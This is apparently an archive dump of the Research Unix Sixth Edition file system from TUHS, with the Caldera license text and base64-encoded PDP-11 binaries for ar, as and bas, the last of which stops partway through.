These files are the Research Unix Sixth Edition distribution, downloaded from
https://www.tuhs.org/Archive/Distributions/Research/Dennis_v6/.
They are distributed under the terms of the license posted at
https://www.tuhs.org/Archive/Caldera-license.pdf and
reproduced in LICENSE.pdf and LICENSE.txt.

Additional files have been added to the file system in the running system,
in /usr/dmr and /usr/ken from parts of the TUHS archive:
https://www.tuhs.org/Archive/Applications/Dennis_Tapes/

-- /LICENSE.txt mode=010444 --
Caldera
240 West Center Street
Orem, Utah 84057
801-765-4999 Fax 801-765-4481

January 23, 2002

Dear UNIXï£¨ enthusiasts,

Caldera International, Inc. hereby grants a fee free license that
includes the rights use, modify and distribute this named source code,
including creating derived binary products created from the source
code. The source code for which Caldera International, Inc. grants
rights are limited to the following UNIX Operating Systems that
operate on the 16-Bit PDP-11 CPU and early versions of the 32-Bit UNIX
Operating System, with specific exclusion of UNIX System III and UNIX
System V and successor operating systems:

	32-bit 32V UNIX
	16 bit UNIX Versions 1, 2, 3, 4, 5, 6, 7

Caldera International, Inc. makes no guarantees or commitments that
any source code is available from Caldera International, Inc.

The following copyright notice applies to the source code files for
which this license is granted.

Copyright (c) Caldera International Inc. 2001-2002. All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

 * Redistributions of source code and documentation must retain the above
   copyright notice, this list of conditions and the following disclaimer.

 * Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

 * All advertising materials mentioning features or use of this software
   must display the following acknowledgement:

     This product includes software developed or owned by
     Caldera International, Inc.

 * Neither the name of Caldera International, Inc. nor the names of its
   contributors may be used to endorse or promote products derived from
   this software without specific prior written permission.

USE OF THE SOFTWARE PROVIDED FOR UNDER THIS LICENSE BY CALDERA INTERNATIONAL,
INC. AND CONTRIBUTORS ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL CALDERA
INTERNATIONAL, INC. BE LIABLE FOR ANY DIRECT, INDIRECT INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Very truly yours,

/signed/ Bill Broderick

Bill Broderick
Director, Licensing Services

* UNIX is a registered trademark of The Open Group in the US and other
countries.
-- / mode=0140775 uid=3 gid=3 atime=174929811 mtime=174929811 --
-- /bin mode=0140775 uid=3 gid=3 atime=172967521 mtime=169274854 --
-- /bin/ar mode=0100775 uid=3 gid=3 atime=174924616 mtime=174922389 base64=1 --
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
-- /bin/as mode=0110775 uid=3 gid=3 atime=174929177 mtime=174920362 base64=1 --
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
AAAc4VKwB3AGT+JhDOUM5F3//AReD/w0Xg/wMgAwcmEMAQgxXACwcD1QsHAwMgBQLDFQEA
AgHVCwMKg1WFAPT09PT+9PT09O7+9PTu9PT09PT09PT09PT09PT09PT07vDy9PDw8Pbw8P
Dw8PAu+jAxMjM0NTY3ODnw/gDw9PT0QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVrw7PDw
X/RhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5evTq9H70AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAASJgDkAAF4APSBIIFMgZwAAAASJAAAAAASJAAACABKJAABqNwiJAAAkAWYg
eHh4eAoAEYmkOQWJAAAAAAAvdG1wL2F0bTFhAC90bXAvYXRtMmEAL3RtcC9hdG0zYQD///
///////////////////////2o3gDkuAAAAAAAAAAIAAAAuLgAAAAAAAAEAAAByMAAAAAAA
ABQAAAByMQAAAAAAABQAAQByMgAAAAAAABQAAgByMwAAAAAAABQAAwByNAAAAAAAABQABA
ByNQAAAAAAABQABQBzcAAAAAAAABQABgBwYwAAAAAAABQABwBleGl0AAAAAAEAAQBmb3Jr
AAAAAAEAAgByZWFkAAAAAAEAAwB3cml0ZQAAAAEABABvcGVuAAAAAAEABQBjbG9zZQAAAA
EABgB3YWl0AAAAAAEABwBjcmVhdAAAAAEACABsaW5rAAAAAAEACQB1bmxpbmsAAAEACgBl
eGVjAAAAAAEACwBjaGRpcgAAAAEADAB0aW1lAAAAAAEADQBtYWtkaXIAAAEADgBjaG1vZA
AAAAEADwBjaG93bgAAAAEAEABicmVhawAAAAEAEQBzdGF0AAAAAAEAEgBzZWVrAAAAAAEA
EwB0ZWxsAAAAAAEAFABtb3VudAAAAAEAFQB1bW91bnQAAAEAFgBzZXR1aWQAAAEAFwBnZX
R1aWQAAAEAGABzdGltZQAAAAEAGQBmc3RhdAAAAAEAHABtZGF0ZQAAAAEAHgBzdHR5AAAA
AAEAHwBndHR5AAAAAAEAIABuaWNlAAAAAAEAIgBzaWduYWwAAAEAMABtb3YAAAAAAAsAAB
Btb3ZiAAAAAAsAAJBjbXAAAAAAAAsAACBjbXBiAAAAAAsAAKBiaXQAAAAAAAsAADBiaXRi
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
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-- /bin/bas mode=0110775 uid=3 gid=3 atime=174927826 mtime=174922415 base64=1 --
CAGAH7wCljsAAAAAAAABAPcVAQBkIzCJBADoFwnwDYlAEDcQyiL3CfIUMIkCALQAtxG+Ij
cKSCPBFWEAd5DaHxKJAiAGIwWHgQpXIHoA9oMKAQiJAiCAAQaHNxAqIwWJAiAAAAuGwBVg
APcJvAEBiVRtcCBmaWxlPwoAADcQ/CLGHW4ilyMCAAwFgB0EAMEVDCARlP4CwBUMIHcJEB
K6WwOH9wkIAxsBwBWiAPcJegEWAUNhbm5vdCBvcGVuIGZpbGUKADCJAgC0AMAVCgB3CVIC
dwn0AHJlYWR5CgAAxh0QIjcKnCL3CawAwxUGI8CS9wlMAT0BdwniDhcgIAADAxcgCQA1As
MVklFAEAIG9wniAAsgBQPLCwMDw2UGAPkB1yCOWAqHdwmgAHRvbyBtYW55IGxpbmVzCgAT
ENMdQCLAHUQi9x04IoQfAIm8IMAVBiP3CSgAgAo3YCQiNxB2H8AdJCL3FQYjah8AicIgtw
HDFQYj9wnGArIBwJSFACYKjgoXogoABQMXogAAAgOACvcBgBWHAMEVBiN3CTARulsLh8AL
CQNXIGkjBoYRkBegCgDzAgmKhwDAHQ5aBAMGiTcKBlrqAXcAign3C/xZAwMGiTcK9Fn3C6
ghBwP3CWABBAHAFQYj9wlAAEAR9wk6AHcA6v7DCvcL0FkDAwaJNwrIWcEVBiNDIAgCwBVf
AHcJEgHAFQgAdwkKAUCSdwkEAVekCgDwAncAtP43EKYe9wlM/zcQoB7AHUAhAInCIIcAFy
AwAAWHFyA5AAKCzmUCAIcAFyBhAAWHFyB6AAKCzmUCABcgQQAFhxcgWgACgs5lAgCHAMEV
dCMJCjEKAgBXIHgjAYYRkMCU9wnG/wEB9wH3Caz/AQHzAcEVPCDJLeQgCgLxLeAgAgAGAs
HlPCCBDM5lAgCHAMFlBABXIJAg7ofBFXojyQsLA8ktuCAFAvEttCACAAEChwDBZQ4A8wFX
IE4uDYd3CeL+b3V0IG9mIHN5bWJvbCBzcGFjZQoAAMkdgiDxHYAgAgAxCgQAMQoOAIcAFy
AgAAMDFyAJAAICwJT4AYcA94vGHwMD9wmODIUANxC4H8AVAQAEidwiAQCFACYKwRWSUckL
CwPJLTQgBYKAEwIDCSIBg04QwWUGAPMBgRUPA3cUGiB3FGIdwB0MIACJvCDAHQQgA4kGI2
QAzmUCAIcAwRWSUckLBQMJIA4DwWUGAPkBdwkw/mxhYmVsIG5vdCBmb3VuZAoAAIcAwBV6
I8EVkCAA8Vf1gEBQFFAU0BUBAAH2EPhXILwg94cQCocANwoeH/cV8CI4H8QVai73C54fAQ
OHAPcJVP8aAcAdkB/3CY7/MREEAPcJnAAAAbcKfh8XIbpN74d3Cbz9b3V0IG9mIGNvZGUg
c3BhY2UKAAD3C84eAgNfADQH1y3kHvAiAgNfACAG1BXOAIcANwqyHvcV8CLMHsQVqk33CU
oACAEXLf7/RAwEA9QVlgvUFaoL9wuOHgIDXwA0BxchklEMh3cJVP1vdXQgb2YgY29kZSBz
cGFjZQoAANQVzgA3EWQexBWqTXcA4AXDFQYjwJT3CZz9EAHDCncJMAsXICAABwMXIAkABA
PDFQYjwJQDAdQVygtUEPcJSP4XIAoAAQKHAOYQ9wl6/R4B9wmW/RsB1gv3CSz+wwp5ANwE
JgVoBWgFeAWcBYgF5gWoBrIG1AZMB2gHHgWMBQoGPgZmBpwGcgeAB6YHgxXDCvcJngIXIA
oAAgNfANAGzmUCAIcA9xXOCkoeAwH3FQILQh4XIAoACAIA8fcJ2AQX/v9/9wnQBBAB9wlm
AhcgCgADAtQVxAwIAcMK9wlUAhcgCgACA18A0AbUHQgehwAXIAoAAgNfANAG1BVEC4cAFy
AKAAIDXwDQBtQVuAqHACYKCQEXIAoAAgNfANAG1BUEEocA5hHAlPcJXv0XIAoAGQMXICIA
BgPDCvcJ9gHUFZYL9AHUFbQLzJQXoyIABQMXpQoA+QJfANAGxGUCAMRFAQDhAdYLAgPUFa
oLhwD3CcIB1BV0Cj8REh33ZQIADB3UC/cJBP0XIAoADQP3Ca7+AAH35QIA9BzXLfAc8CIE
h8Ef6BwJEYcAdwmW+2lmLi4uZWxzZS4uLmZpIGltYmFsYW5jZQoA1BWCCiYR1Av35QIAuB
zXLbQc8CLmh8EfrBwJEb8Vphz3ZQIAoByHAAKJDQHAFZJRFyCaWAMD0BUAAPoBCokCIAeJ
dwAC+guJjAaWBgGJL2Jpbi9lZAAtCpQGDCAAABcgCgACA8CU+wGHAPcJAAHUFaQKhwAXIA
oABgP3CfAAFyAKAAcCAwEA8fcJRgPUFcgMhwD3CRD7JhH3CQIBJhEXID0A9wL3CwYc9AL3
CcAA1B30GzcR8BsUJYAVgRVUFEAg/YfUFbQMwR3cG9EVggoREcMK9wmYANQVIAzUFXQK1B
3EGzcRwBsXIAoABAP3CYj9AAENAYcAdwmC+mZvci9uZXh0IGltYmFsYW5jZQoAwR2UG/ED
QBg3GIwb1BV+CtAVRAwQJBQQERGHAPcJQADUFaALhwDUFUoL9wki/tQVbAuHAPcJKADDCv
cJIgAXIAoABQIX9YBA9wl4AgMBwwr3CQwA1BV4C4cA1BWEC4cA9wkGAPcJTAKHAPcJIgAX
ID0AAwP3CTwChwD3CyIbAgP3CRT69wni/3cJIAJEDIcA9wkuABcgJgAEAxcgfAAJA4cA9w
kOAvcJGAB3Cf4B+gvxAfcJ/gH3CQgAdwnuAewL6QH3CY4A9wksAIcAJgomEPcJgAD3CdwB
lBX3CRgABAHUFUAMjgrzAc4KAwXUFfoL+wHWC4cAFyA+AAcDFyA8AA0DFyA9ABoDhwDAFQ
gM16I9ABsCgwrAFRAMFwHXoj4ABAKDCsAVKAwQAcAVGAzXoj0ACwKDCsAVIAwHAdeiPQAB
A4cAgwrAFTAM9wlmAc5lAgCHAPcJLgAXICsABAMXIC0ACQOHAPcJSgH3CRgAdwk6AVQM8Q
H3CToB9wkIAHcJKgFaDOkB9wkuABcgKgAEAxcgLwAJA4cA9wkYAfcJGAB3CQgBYgzxAfcJ
CAH3CQgAdwn4AGgM6QH3CRgAFyBeAAEDhwD3CewA9wkIAHcJ3ABwDPQBwJT3Cdz5FyBfAA
YC9wnw/3cJxACSDIcAwwr3CQIAhwDAlPcJvPn3FQEAoBkXICgACQL3CWD+FyApAAICwJQq
AfcJgPgXIC4AAwP3CcL4BwHDCncJlAZqAfcJlAAbAfcJwPgWAfcJ3PgKAXcJLPhyZXNlcn
ZlZCBuYW1lCgAAFyGSUQaG1BXADFQQNwo+GQIB9wkw+PcJSvkXICgACgL3CT4AdwmGAIYK
FyApAPECwJTxARcgWwAPAvcLEBkCA/cJAvh3CWYA9gw3CgAZFyBdAN8CwJTfAYcA9wkEAF
QVhQD3C+gYBALUFa4MtwreGIcAJhBm+EDxAPADAtQVmgwTARf3gEAA8AMC1BWeDAwBAPtA
/kD3APAEAtQVlgwUEAMB1BWkDBT4VvWAFYcAJgrXoikAAgLAlAYBjgr3CU79FyAsAPoDVB
WUFYUAwxW6W/cQdhhcAFPxAPAEA9QLXADDHWYYBBVcACMR4x1cGPcQWBi3ClYYAAr3CXIE
QPEA8AMEdwAiAwv1Jvv3CRb5gBX3CcL4RBwEAFwA9wni+MAdIBj3CUgK9wn6+MQVai5cAA
iJDCC2AQOHNxCQGBYBwB0MAPcVAQCEGPcJMPcsAUNhbm5vdCBjcmVhdGUgYi5vdXQKAAD3
FQEAYhgT9Sb7C/U3+2AY9wka+AoBzi1WGAeCwBUGI/cJ9Pa3CkgY8wH3JQEAOBgGA8AdMh
gGifcVAQAqGNYLXAAKiQIgAYnAFQIA9wlaBPcJIgTAFQEA9wlOBMAVAwD3CUYEt4p0F1wA
